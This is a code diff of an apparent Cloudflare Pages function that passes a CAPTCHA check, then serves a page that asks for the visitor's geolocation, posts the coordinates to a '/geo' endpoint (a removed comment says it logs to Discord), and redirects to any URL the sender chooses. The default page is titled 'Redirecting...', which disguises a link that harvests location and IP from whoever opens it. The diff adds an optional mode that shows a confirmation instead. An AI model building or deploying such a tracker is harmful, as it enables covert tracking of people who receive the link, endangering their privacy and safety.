@@ -3,13 +3,14 @@ export async function onRequestPost({ request, env }) {
 
   const token = form.get('cf-turnstile-response');
   const redirect = form.get("redirect") || "https://www.google.com";
+  const noredirect = form.get("noredirect") === "1";
   const ip = request.headers.get("cf-connecting-ip");
 
   if (!token) {
     return new Response("Missing CAPTCHA token", { status: 400 });
   }
 
-  // ✅ Validate redirect is a real URL (basic safety)
+  // Validate redirect
   let redirectURL;
   try {
     redirectURL = new URL(redirect).toString();
@@ -17,7 +18,7 @@ export async function onRequestPost({ request, env }) {
     redirectURL = "https://www.google.com";
   }
 
-  // ✅ Verify Turnstile
+  // Verify Turnstile
   const verifyResp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -34,14 +35,16 @@ export async function onRequestPost({ request, env }) {
     return new Response("CAPTCHA verification failed", { status: 403 });
   }
 
-  // ✅ Return HTML that triggers geolocation, logs to Discord, then redirects
+  // Inject HTML with geolocation logic
   const html = `
     <!DOCTYPE html>
     <html>
-    <head><title>Redirecting...</title></head>
+    <head><title>Location Logging</title></head>
     <body>
       <script>
         const redirect = ${JSON.stringify(redirectURL)};
+        const noredirect = ${noredirect};
+
         navigator.geolocation.getCurrentPosition(function(location) {
           fetch('/geo', {
             method: 'POST',
@@ -51,10 +54,18 @@ export async function onRequestPost({ request, env }) {
               lon: location.coords.longitude
             })
           }).finally(function() {
-            window.location.href = redirect;
+            if (noredirect) {
+              document.body.innerHTML = "<h2>✅ Location received. Thank you.</h2>";
+            } else {
+              window.location.href = redirect;
+            }
           });
         }, function() {
-          window.location.href = redirect;
+          if (noredirect) {
+            document.body.innerHTML = "<h2>⚠️ Location access denied.</h2>";
+          } else {
+            window.location.href = redirect;
+          }
         });
       </script>
     </body>
